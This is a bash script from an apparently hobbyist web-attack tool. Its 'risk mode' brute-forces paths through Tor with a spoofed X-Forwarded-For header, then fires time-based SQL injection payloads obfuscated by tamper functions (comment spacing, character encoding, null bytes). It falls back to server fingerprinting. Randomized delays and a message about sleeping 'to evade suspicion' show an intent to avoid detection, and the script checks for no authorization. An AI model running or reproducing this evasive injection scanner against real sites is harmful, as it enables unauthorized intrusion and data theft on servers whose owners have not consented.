# ImCurvin' v1.0.5
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# Code version 2
# I myself still wondering, why do i name this "risk".
# Welp, sunshine and rainbow. For this file, me will make the variable sweer sweet. ig
#chinesee, ah i forgot how to spell chinese. Ah whatever,correct me if the food's name is wrong.
#when yh

echo ""
echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
echo ""
sleep 3
#Check if YOU( yes you ) input some uh, custom target.
if [ -n "$custom_wordlist" ]; then
    if [ ! -f "$custom_wordlist" ]; then
        echo "[!] Custom Wordlist not found."
        exit 1
    fi
    Cupcake_pie="$custom_wordlist"
else
    Cupcake_pie="$(dirname "$0")/../data/targets.txt"
fi

Strawberry_pudding="$(dirname "$0")/../data/sqli.txt"
Choco_muffin="$(dirname "$0")/../data/gentle.txt"
ROOT_LOG_FILE="$(dirname "$0")/../Target.log"

source "$(dirname "$0")/../tamper/hungry.sh"
#oh yeah man, "source". easy to debug now.
if [ ! -f "$Cupcake_pie" ] || [ ! -f "$Strawberry_pudding" ] || [ ! -f "$Choco_muffin" ]; then
    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Database files are missing."
    exit 1
fi

if [ -s "$ROOT_LOG_FILE" ]; then
    if [ "$skip_confirm" = "true" ]; then
        > "$ROOT_LOG_FILE"
    else
        echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Target.log already contains previous scan data or you just input something on it."
        read -p "$(echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Continuing will overwrite and wipe the old log file. Proceed? (y/n): ")" confirm_overwrite

        case "$confirm_overwrite" in
            [Yy]* )
                > "$ROOT_LOG_FILE"
                echo -e "[i] Target.log cleared. You can continue now\n"
                ;;
            * )
                echo -e "\n\e[0;33m[\e[0m-\e[0;33m]\e[0m Cancelled. You cant continue if your log is not empty."
                exit 0
                ;;
        esac
    fi
else
    > "$ROOT_LOG_FILE"
fi

Chicken() {
    local crispy_thigh="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $target_url/$crispy_thigh ( Mode RISK )"
    local http_response=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP")
    echo "$http_response"

    if echo "$http_response" | grep -q "200"; then
        echo "FOUND_200|/$crispy_thigh" >> "$ROOT_LOG_FILE"
        return 0
    fi
    return 1
}

time_audit_engine() {
    local tangyuan="$1"
    local mooncake="$2"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$tangyuan$mooncake"

    local proxy_flag="--socks5-hostname 127.0.0.1:9050"
    if [ -n "$custom_proxy" ]; then
        proxy_flag="-x $custom_proxy"
    fi
   
    local stopwatch_seconds=$(curl $proxy_flag -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")

    if (( $(echo "$stopwatch_seconds > 4.0" | bc -l) )); then
        local lapis_legit=$(echo "$mooncake" | sed 's/Sleep(5)/Sleep(2)/g' | sed 's/sleep(5)/sleep(2)/g')
        local wash_hands_now=$(curl $proxy_flag -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$lapis_legit")

        if (( $(echo "$wash_hands_now > 1.5" | bc -l) )) && (( $(echo "$wash_hands_now < 3.5" | bc -l) )); then
            echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
            echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;31m[!+!] 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
            echo "SQLI_ALERT|$tangyuan$mooncake" >> "$ROOT_LOG_FILE"
            return 0
        else
            echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
            echo -e "[i] Time Delay First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
            echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
        fi
    else
        echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
        echo -e "\e[0;37m[-] Status: Safe, normal server response time.\e[0m"
    fi
    return 1
}

gentle_probe_engine() {
    local fresh_salad="$1"
    echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Deploying Gentle Probing on $target_url/$fresh_salad"
    local restaurant_cashier=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -X OPTIONS -A "Mozilla/5.0" -s -Iv "$target_url/$fresh_salad" --stderr - | grep -Ei "< (Allow|Server|X-Powered-By)")
    if [ -n "$restaurant_cashier" ]; then
        echo -e "$restaurant_cashier" | sed 's/^/    -> /'
    else
        echo -e "[i] Status: No explicit server footprint returned."
    fi
    echo ""
}

risk_stage_success="false"
while IFS= read -r target_word || [ -n "$target_word" ]; do
    [[ -z "$target_word" || "$target_word" =~ ^# ]] && continue
    if Chicken "$target_word"; then
        risk_stage_success="true"
        if [ "$store_mode" = "false" ]; then
            break
        fi
    fi
    sleep $((4 + RANDOM % 5))
done < <(shuf "$Cupcake_pie")

#Oh man, he told me to buy an egg.
if [ "$store_mode" = "true" ] && echo "FOUND_200" | grep -qE "FOUND_200"; then
    if [ -s "$ROOT_LOG_FILE" ]; then
        risk_stage_success="true"
    fi
fi

if [ "$risk_stage_success" = "false" ]; then
    echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Stage 1 failed to acquire 200 OK. Escalating to Time based."
if [[ "$target_url" != *?\=* ]]; then
        echo -e "\e[0;33m[\e[0m!\e[0;37m]\e[0m Target URL does not contain any injectable parameters."
        
        # Cnf = no nonsense.
        if [ "$skip_confirm" = "true" ]; then
            echo -e "\e[0;34m[\e[0m+\e[0;37m]\e[0m [-cnf Active] Proceeding with default injection path..."
            user_choice="2"
        else
            echo -e "\n\e[0;34m Option:\e[0m"
            echo -e "  1. Input custom login/parameter path manually"
            echo -e "  2. Proceed with default scanning path (Run as usual)"
            echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Choose one option below (1/2): "
            read -r user_choice
        fi

        case "$user_choice" in
            1)
                echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Enter custom path with parameter, make sure to use '|' at the end. (e.g., /login.php?user=1|): "
                read -r custom_path
                if [[ "$custom_path" != /* ]]; then
                    custom_path="/$custom_path"
                fi
                # Use user own url path.
                target_url="${target_url}${custom_path}"
                echo -e "\e[0;34m[\e[0m=\e[0;34m]\e[0m Target URL updated."
                ;;
            2|* )
                echo -e "\e[0;34m[\e[0m+\e[0;34m]\e[0m Proceeding with standard execution path."
                ;;
        esac
    fi
    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
    sleep 5

    sqli_stage_success="false"
    while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
        [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue

        tangyuan=$(echo "$sqli_payload" | cut -d'|' -f1)
        mooncake=$(echo "$sqli_payload" | cut -d'|' -f2-)

        lapis_satu=$(space2comment_engine "$mooncake") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
        lapis_dua=$(between_engine "$lapis_satu") #Im proud eating lapis.
        lapis_tiga=$(charencode_engine "$lapis_dua") #Zamn, lapis.
        masked_payload=$(appendnullbyte_engine "$lapis_tiga") #"masked payload", i dont really like that name. Any suggestion to change it?

        if time_audit_engine "$tangyuan" "$masked_payload"; then
            sqli_stage_success="true"
        fi
        sleep $((5 + RANDOM % 4))
    done < <(shuf "$Strawberry_pudding")

    if [ "$sqli_stage_success" = "false" ]; then
        echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Time based returned zero anomalies. Dropping gear to Gentle Mode."

        while IFS= read -r gentle_word || [ -n "$gentle_word" ]; do
            [[ -z "$gentle_word" || "$gentle_word" =~ ^# ]] && continue
            gentle_probe_engine "$gentle_word"
            sleep $((3 + RANDOM % 3))
        done < <(shuf "$Choco_muffin")
    fi
fi
echo ""
echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 1 seconds... uh what. The program itself its done."
sleep 1
#You input -cnf, then ok. Whatever.
if [ "$skip_confirm" = "true" ]; then
    player_want="y"
else
    read -p "[?] Do you want to me to double check raw hits to eliminate false positives? (y/n): " player_want
fi

case "$player_want" in
    [Yy]* )
        if [ "$skip_confirm" = "true" ]; then
            echo -e "\n\e[0;32m[+]\e[0m [-cnf Active] Automatically triggering post validation check."
        else
            echo -e "\n\e[0;32m[+]\e[0m Waiting..."
        fi
        sleep 1
        if ! command -v python3 &> /dev/null; then
            echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Python 3 is not installed."
            echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Please install it first to run it."
            echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Aborted. Raw logs still kept in Target.log."
            exit 1
        fi

        python3 "$(dirname "$0")/../validators/validate.py"
        ;;
    * )
        echo -e "\n\e[0;33m[!]\e[0m Post validation skipped. Raw outputs kept inside Target.log file. You can see it if you want tho."
        ;;
esac

